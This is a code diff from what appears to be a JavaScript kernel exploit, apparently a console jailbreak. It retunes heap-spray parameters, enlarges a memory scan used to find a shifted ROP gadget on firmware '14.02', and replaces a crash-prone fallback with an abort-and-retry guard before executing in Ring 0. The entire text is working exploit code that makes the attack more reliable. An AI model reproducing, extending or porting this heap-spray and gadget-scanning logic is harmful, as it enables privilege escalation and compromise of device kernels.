@@ -56,15 +56,15 @@ const GADGETS = {
 const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };
 
 const TUNE = {
-  sprays: 200,
+  sprays: 126,
   object: 104,
   window: 0x4000,
   entries: 420,
   stride: 0x90,
   seed: 45,
   spare: 8,
-  units: 24,
-  batch: 100,
+  units: 15,
+  batch: 60,
   ceiling: 63,
 };
 
@@ -1064,8 +1064,9 @@ async function attempt(ctx, opts) {
   }
 
   {
-    const SCAN_WIN = 0x1000;
-    const SCAN_PRE = 0x200;
+    /* Expanded search window (16KB) to locate shifted gadgets on FW 14.02 */
+    const SCAN_WIN = 0x4000;
+    const SCAN_PRE = 0x2000;
     const scanBuf = alloc(SCAN_WIN + 16);
     wipe(scanBuf, SCAN_WIN + 16);
     const scanRef = alloc(16);
@@ -1091,10 +1092,16 @@ async function attempt(ctx, opts) {
             + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
         K.swap_rbp = realRVA;
       } else {
-        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
+        /* CRITICAL ANTI-PANIC GUARD: Never jump to unverified 14.00 offset in Ring 0! */
+        say("[1b] swap_rbp 4e95c3 not in window -- ABORTING SAFELY to prevent kernel panic");
+        STATE.retry = true;
+        return false;
       }
     } else {
-      say("[1b] scan shot missed -- using original K.swap_rbp");
+      /* CRITICAL ANTI-PANIC GUARD: Scan shot failed; abort cleanly */
+      say("[1b] scan shot missed -- ABORTING SAFELY to prevent kernel panic");
+      STATE.retry = true;
+      return false;
     }
   }
 
